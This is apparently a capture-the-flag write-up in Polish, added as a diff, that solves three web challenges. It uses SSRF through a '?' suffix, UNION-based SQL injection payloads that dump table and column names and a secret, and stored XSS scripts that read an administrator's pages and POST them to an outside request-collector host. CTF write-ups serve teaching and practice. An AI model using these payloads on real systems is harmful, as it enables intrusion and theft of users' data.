@@ -1,0 +1,124 @@
+-- FLAGA 1 --
+FLAG{0c55606a072a912d264846cd22c95020e781}
+
+Zauważamy, że dostępny jest plik script.js który możemy wykonywać w konsoli.
+Metoda getTime wykonuje zapytanie dla podanego id na stronie i strefy czasowej,
+a wynik zapisuje pod tym id, niech dla nas będzie to 'time_ny'. W miejsce
+drugiego argumentu można podać dowolną wartość. Sprawdzamy argument null,
+otrzymujemy "nie udało się pobrać http://None.timezone.internal", co budzi
+podejrzenia, że możemy wykonać SSRF. Chielibyśmy sprawdzić 'localhost', ale
+przeszkadza nam końcówka ".timezone.internal". Żeby się jej pozbyć, dopisujemy
+'?' aby przekształcić końcówkę w argument zapytania. Mamy więc wywołanie w konsoli
+getTime('time_ny', 'localhost?')
+które od razu podaje nam flagę, wyświetloną zamiast czasu dla Nowego Jorku.
+
+
+-- FLAGA 2 --
+FLAG{this_is_a_long_and_interesting_flag_9393265140f32ff7fc9f3b5bc9c065b3e6fdc4f4}
+
+Podstrona ze statystykami wygląda tak, jakby ładowała w tle dane do wyświetlenia
+z bazy danych. Na początek próbujemy określić liczbę kolumn tabeli. Dopisując do
+adresu 'union select null, null, ...' szybko odkrywamy, że tabela ma jedynie
+dwie kolumny. Kolejne eksperymenty pokazują, że pierwsze dwie tabele mają
+kolumny typu teskstowego i liczbowego, a ostatnia dwie kolumny typu liczbowego.
+Ponieważ flaga zdecydowanie bardziej przypomina typ tekstowy, to skupiamy się na
+pierwszym przypadku. Dodatkowo dla dopisania 'union select 'dowolny_tekst', 3000
+zmienia się jedynie druga z tabeli, co oznacza że wyniki są filtrowane w
+poszukiwaniu maksymalnej wartości. Wobec tego exploitujemy tę własność
+wykorzystując SQL injection. Żeby znaleźć flagę musimy poznać metadane bazy.
+W tym celu korzystamy z funkcji string_agg() aby dostać napis złożony z nazw
+wszystkich tabel oraz z funkcji substring() aby móc przesuwać widoczny fragment
+wyniku w prawo (jesteśmy ograniczeni do 60 znaków, wliczając wielokropek). Na
+koniec usuńmy z wyników tabele generowane i zarządzane przez bazę danych,
+a widoczne zostawmy te którymi zarządza użytkownik:
+```
+union select substring(list, 0, 60), '1000000' 
+from(select string_agg(table_name, ', ') as list from information_schema.tables 
+where table_schema = 'public') as table_list
+```
+Dostajemy listę tabel z bazy danych "article_hit, interesting_and_secret_information".
+Sprawdźmy kolumny tabeli o nazwie "interesting_and_secret_information". Wpisujemy
+```
+union select string_agg(column_name, ', '), '1000000' from information_schema.columns 
+where table_name = 'interesting_and_secret_information'
+```
+Otrzymaliśmy tylko jedną kolumnę - secret_text_for_example_a_flag. Stąd
+ostatnimi dwoma zapytaniami odczytujemy flagę:
+```
+union select substring(secret_text_for_example_a_flag, 1, 40), '1000000' from interesting_and_secret_information
+union select substring(secret_text_for_example_a_flag, 41, 100), '1000000' from interesting_and_secret_information
+```
+
+
+-- FLAGA 3 --
+FLAG{752e8db03d875cfec6bdf8305756f1bb}
+
+Podstrona do proponowania artykułów zawiera pole tekstowe, które potencjalnie
+pozwala na atak XSS na administratora. Próbujemy zatem wyłuskać od niego kod
+źródłowy w nadziei, że różni się on od tego dostępnego użytkownikowi. Do
+przeglądania odpowiedzi na żądanie korzystamy z requestbina:
+```
+article=<script>
+fetch('https://eo2h9y9p943hvx3.m.pipedream.net', {
+  "method": "POST",
+  "body"  : document.body.innerHTML
+});
+</script>
+```
+Czytamy wyłuskany HTML i zauważamy
+```
+<li class="nav-item">
+  <a class="nav-link" href="/send_feedback">Wyślij autorowi ocenę artykułu</a>
+</li>
+```
+a więc administrator ma dostęp do dodatkowych funkcjonalności. Modyfikujemy
+żądanie tak, aby dostać kod źródłowy znalezionej podstrony:
+```
+article=<script>
+fetch('/send_feedback')
+  .then(
+    response => response.text())
+  .then(
+    text => fetch('https://eo2h9y9p943hvx3.m.pipedream.net', {
+      "method": "POST",
+      "body"  : text
+})
+);
+</script>
+```
+Otrzymujemy analogiczny kod strony, jednak tym razem jest w nim zawarty formularz
+```
+<form method="POST">
+  <div class="form-group">
+    <label for="receiver">Login odbiorcy</label>
+    <input type="text" class="form-control" id="receiver" name="receiver" placeholder="Username">
+  </div>
+  <div class="form-group">
+    <label for="content">Treść</label>
+    <textarea class="form-control" id="content" name="content" rows="3"></textarea>
+  </div>
+  <div class="form-check">
+    <input type="checkbox" class="form-check-input" id="debug" name="debug">
+    <label class="form-check-label" for="debug">Dołącz informacje diagnostyczne na temat systemu (testowa funkcjonalność)</label>
+  </div>
+  <div class="form-group">
+      <button class="btn btn-primary" type="submit">Wyślij</button>
+  </div>
+</form>
+```
+Piszemy więc żądanie wysyłające dane do formularza, z zaznaczeniem pola o
+dołączeniu danych diagnostycznych:
+```
+article=<script>
+var form_data = new FormData();
+form_data.append("receiver", "adminadminadmin");
+form_data.append("content", "Enjoy your flag!");
+form_data.append("debug", true);
+fetch('/send_feedback', {
+  "method": "POST",
+  "body"  : form_data
+});
+</script>
+```
+Po odświeżeniu strony pojawia się baner z informacją zwrotną zawierającą flagę.
+
